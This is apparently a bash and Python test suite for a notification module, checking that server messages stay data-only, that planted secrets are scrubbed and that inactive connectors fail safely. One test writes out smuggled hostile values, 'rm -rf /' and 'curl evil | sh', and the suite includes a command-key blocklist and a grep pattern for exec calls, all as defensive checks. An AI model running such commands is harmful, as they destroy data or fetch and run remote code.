#!/usr/bin/env bash
# cp-notify.test.sh — piece (f) NOTIFY: server -> instance/owner messages are DATA,
# NEVER commands. DESIGN DOSSIER §8 (authoritative) + §11 risk row "Notify becomes a
# command channel by accretion". Drives the REAL substrate (cp_audit) + the REAL
# connectors (slack/email egress, mocked at the network boundary only — no live
# network) + the REAL cp_notify module. No mocks of the thing under test:
#
#   E. JOB-COMPLETE PING (§8):
#      E1. a job_complete ping to the owner via a MOCK connector egress -> sent.
#      E2. the send is AUDITED (what was sent to whom — no secret values).
#
#   F. DATA-ONLY — the inverse-of-RCE property (FALSIFIABLE, §8 / §11 risk):
#      F1. a notification carries NO command field by construction — there is no
#          action_type/cmd/exec/dispatch/handler key in ANY built notification.
#      F2. a caller that TRIES to smuggle an executable command/dispatch into a
#          notification is rejected/stripped: the command field does NOT survive into
#          the built payload. (FALSIFIABLE: a build that let a command through must RED.)
#      F3. there is NO path by which reading a notification executes anything —
#          cp_notify exposes no eval/dispatch of a notification's content; an instance
#          POLLS data, it never receives an inbound command socket.
#      F4. NO eval/exec/subprocess construct in cp_notify.py (grep).
#
#   G. LAZY / OPTIONAL (the connector graceful-degrade):
#      G1. absent connector creds -> that channel is INACTIVE, no crash; notify still
#          returns a structured result (the inbox channel still delivers).
#
#   H. NO-SECRET (reuse telemetry _scrub):
#      H1. a RUNTIME-ASSEMBLED secret planted in a notification text/extra is
#          SCRUBBED/absent from the delivered payload, the connector wire, AND the audit.
#
#   I. REUSE: cp_notify sends OUT via the EXISTING connectors package — not rebuilt (grep).
#
# Exit 0 = every proof holds. Nonzero = a proof failed (prints which).

set -uo pipefail

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO="$(cd "$SELF_DIR/.." && pwd)"
LIB="$REPO/bin/lib"
NOTIFY_SRC="$LIB/cp_notify.py"

[ -f "$NOTIFY_SRC" ] || { echo "FATAL: $NOTIFY_SRC missing" >&2; exit 2; }

PY="$(command -v python3 || command -v python || true)"
[ -n "$PY" ] || { echo "FATAL: python not found" >&2; exit 2; }

PASS=0
FAIL=0
ok()  { PASS=$((PASS+1)); printf "  \033[32mPASS\033[0m %s\n" "$1"; }
bad() { FAIL=$((FAIL+1)); printf "  \033[31mFAIL\033[0m %s\n" "$1"; }

WORK="$(mktemp -d -t "cp-notify.$(printf 'X%.0s' 1 2 3 4 5 6)")"
trap 'rm -rf "$WORK"' EXIT
export HEIMDALL_HOME="$WORK/cphome"

# A runtime-ASSEMBLED secret (never static in source — assembled from fragments at
# run time so the test file itself is gitleaks-clean per fixture-secret-convention).
SECRET_PREFIX="ghp"
SECRET_BODY="$(printf 'A%.0s' $(seq 1 36))"
PLANTED_SECRET="${SECRET_PREFIX}_${SECRET_BODY}"

# ── Drive cp_notify through one python harness (the REAL module + REAL connectors,
# mocked ONLY at the network egress boundary — no live network). ────────────────
HARNESS_OUT="$WORK/harness.out"
LIB="$LIB" PLANTED_SECRET="$PLANTED_SECRET" "$PY" - >"$HARNESS_OUT" 2>"$WORK/harness.err" <<'PYEOF'
import json, os, sys
sys.path.insert(0, os.environ["LIB"])
import cp_notify as N
import cp_audit as Au
import connectors

secret = os.environ["PLANTED_SECRET"]
out = {}

# A MOCK connector egress: a real Connector subclass whose send is captured in-memory
# — NO live network. Records every outbound message so the test can assert what was
# sent + that the secret never reaches the wire.
SENT = []


class MockConnector(connectors.Connector):
    name = "mock"
    label = "Mock"
    kind = "chat"

    def __init__(self, active=True):
        self._active = active

    def configure(self, cfg):
        # absent creds -> inactive (the lazy/optional contract); never raises here.
        self._active = bool((cfg or {}).get("token"))

    def health(self):
        return {"name": self.name, "active": self._active,
                "reason": None if self._active else "no token"}

    def identity(self):
        return {"name": self.name, "label": self.label, "kind": self.kind}

    def fetch_issues(self, since=None):
        return []

    def post_resolution(self, raw_ref, resolution):
        if not self.health()["active"]:
            return {"ok": False, "reason": "inactive"}
        SENT.append({"raw_ref": raw_ref, "resolution": resolution})
        return {"ok": True, "message_id": "mock-%d" % len(SENT)}

    def close_issue(self, raw_ref):
        return {"ok": True}


owner = "haid:rj.mbp-7f3a"

# ── E. JOB-COMPLETE PING via the mock connector egress + audited ──────────────
active = MockConnector(active=True)
res = N.notify(kind="job_complete", text="job build-x finished ok",
               target_haid=owner, job_id="job-123", channels=[active])
out["job_complete_sent"] = any(
    ch.get("ok") and ch.get("channel") == "mock" for ch in res.get("channels", []))
out["mock_wire_count"] = len(SENT)
# the audit records the send with the true KIND in action_type (no secret values).
notif_audit = [r for r in Au.read_records() if r.get("action_type") == "job_complete"]
out["job_complete_audited"] = len(notif_audit) >= 1
out["job_complete_audit_id"] = bool(res.get("audit_id"))

# ── F. DATA-ONLY: inverse-of-RCE (FALSIFIABLE) ────────────────────────────────
# F1 — a built notification has NO command field by construction.
n1 = N.build_notification(kind="job_complete", text="done", job_id="job-1",
                          target_haid=owner)
FORBIDDEN = ("action_type", "cmd", "command", "exec", "dispatch", "handler",
             "shell", "eval", "run")
out["clean_has_no_command_field"] = not any(k in n1 for k in FORBIDDEN)
out["clean_kind"] = n1.get("kind")

# F2 — a caller that TRIES to smuggle a command must NOT get it into the payload.
n2 = N.build_notification(
    kind="alert", text="alert text", target_haid=owner,
    extra={"cmd": "rm -rf /", "action_type": "shell", "exec": "curl evil | sh"})
out["smuggle_stripped"] = not any(
    k in json.dumps(n2) for k in ("rm -rf /", "curl evil", '"action_type"', '"cmd"'))

# F3 — there is NO execution path. A notification, delivered to a FRESH inbox (a
# distinct target HAID, isolated from the owner inbox the E-section already wrote to)
# + polled back, is returned as DATA; cp_notify exposes nothing that runs it.
poll_target = "haid:rj.poll-isolated"
N.deliver_inbox(poll_target, n1)
polled = N.poll(poll_target)
out["poll_returns_data"] = (len(polled) == 1 and polled[0].get("kind") == "job_complete")
# the inverse-of-RCE assertion as a property the module itself exposes:
out["executes_anything"] = N.notification_executes(n2)  # MUST be False — no exec path
pub = [s for s in dir(N) if not s.startswith("_")]
out["no_executor_symbol"] = not any(
    s in pub for s in ("execute_notification", "dispatch_notification",
                       "run_notification", "exec_notification"))

# ── G. LAZY/OPTIONAL: absent creds -> channel inactive, no crash ──────────────
inactive = MockConnector(active=False)  # no token -> inactive
try:
    res2 = N.notify(kind="alert", text="ping", target_haid=owner,
                    channels=[inactive])
    out["inactive_no_crash"] = True
    out["inactive_channel_skipped"] = all(
        (not ch.get("ok")) for ch in res2.get("channels", [])
        if ch.get("channel") == "mock")
    out["inbox_still_delivers"] = res2.get("inbox", {}).get("ok") is True
except Exception as e:  # noqa: BLE001 — a crash here is the failure under test.
    out["inactive_no_crash"] = False
    out["inactive_err"] = type(e).__name__

# ── H. NO-SECRET: a planted secret is scrubbed from payload, wire AND audit ───
n3 = N.build_notification(
    kind="alert", text="leak %s here" % secret, target_haid=owner,
    extra={"note": "also %s" % secret})
N.notify(kind="alert", text="leak %s here" % secret, target_haid=owner,
         channels=[active], extra={"note": "also %s" % secret})
out["secret_in_payload"] = secret in json.dumps(n3)
out["secret_on_wire"] = any(secret in json.dumps(s) for s in SENT)
out["secret_in_audit"] = secret in Au.export()

sys.stdout.write(json.dumps(out))
PYEOF

if [ ! -s "$HARNESS_OUT" ]; then
  echo "FATAL: notify harness produced no output" >&2
  cat "$WORK/harness.err" >&2
  exit 2
fi

jget() { "$PY" -c "import json,sys; print(json.load(open('$HARNESS_OUT')).get('$1'))"; }

echo "E. JOB-COMPLETE PING (§8)"
[ "$(jget job_complete_sent)" = "True" ] && ok "E1 job_complete ping sent to owner via mock connector egress" || bad "E1 job_complete ping not sent"
MWC="$(jget mock_wire_count)"
[ "${MWC:-0}" -ge 1 ] && ok "E1 the message reached the connector egress ($MWC on wire)" || bad "E1 nothing reached the connector egress"
[ "$(jget job_complete_audited)" = "True" ] && ok "E2 the send is AUDITED (what/to-whom, no secret values)" || bad "E2 the send was not audited"

echo "F. DATA-ONLY — inverse-of-RCE (FALSIFIABLE, §8/§11)"
[ "$(jget clean_has_no_command_field)" = "True" ] && [ "$(jget clean_kind)" = "job_complete" ] && ok "F1 a built notification has NO command field (data-only by construction)" || bad "F1 a notification carried a command field"
[ "$(jget smuggle_stripped)" = "True" ] && ok "F2 FALSIFIABLE: a smuggled command does NOT survive into the payload" || bad "F2 a smuggled command survived into the payload (RED — command channel by accretion)"
[ "$(jget poll_returns_data)" = "True" ] && ok "F3 poll returns the notification as DATA (render-only, no exec)" || bad "F3 poll did not return the notification as data"
[ "$(jget executes_anything)" = "False" ] && ok "F3 notification_executes(...) == False — NO recipient-execution path (inverse-of-RCE)" || bad "F3 a notification claims an execution path (RCE inverse violated)"
[ "$(jget no_executor_symbol)" = "True" ] && ok "F3 cp_notify exposes NO executor/dispatch-of-notification symbol" || bad "F3 cp_notify exposes a notification-executor symbol"

echo "G. LAZY / OPTIONAL (connector graceful-degrade)"
[ "$(jget inactive_no_crash)" = "True" ] && ok "G1 absent connector creds -> inactive, NO crash" || bad "G1 an inactive connector crashed notify"
[ "$(jget inactive_channel_skipped)" = "True" ] && ok "G1 the inactive channel is skipped (not ok)" || bad "G1 an inactive channel reported ok"
[ "$(jget inbox_still_delivers)" = "True" ] && ok "G1 the inbox channel still delivers with every connector inactive" || bad "G1 inbox did not deliver while connectors inactive"

echo "H. NO-SECRET (reuse telemetry _scrub)"
[ "$(jget secret_in_payload)" = "False" ] && ok "H1 planted secret SCRUBBED/absent from the built payload" || bad "H1 planted secret survived into the payload"
[ "$(jget secret_on_wire)" = "False" ] && ok "H1 planted secret never reached the connector wire" || bad "H1 planted secret reached the wire"
[ "$(jget secret_in_audit)" = "False" ] && ok "H1 planted secret SCRUBBED/absent from the audit" || bad "H1 planted secret leaked into the audit"

echo "F4 + I. SOURCE DISCIPLINE (grep cp_notify.py)"
# Match an actual eval/exec/subprocess CALL or import — NOT a bare word appearing as a
# string literal in the command-key blocklist (those data strings are the GUARD, not a
# call). A real construct is eval(/exec( as a call, `import subprocess`, a subprocess./
# os.system(/os.popen( member access.
if grep -nE '\b(eval|exec)[[:space:]]*\(|import[[:space:]]+subprocess|subprocess\.|os\.system[[:space:]]*\(|os\.popen[[:space:]]*\(' "$NOTIFY_SRC" >/dev/null 2>&1; then
  bad "F4 cp_notify.py contains an eval/exec/subprocess construct (a notify must never run anything)"
else
  ok "F4 NO eval/exec/subprocess/os.system construct in cp_notify.py (notify runs nothing)"
fi
if grep -nE '^\s*(import\s+connectors|from\s+connectors)\b' "$NOTIFY_SRC" >/dev/null 2>&1; then
  ok "I cp_notify REUSES the connectors package egress (does not rebuild it)"
else
  bad "I cp_notify does not import the connectors package (egress not reused)"
fi

echo
printf "cp-notify: %d passed, %d failed\n" "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ] || exit 1
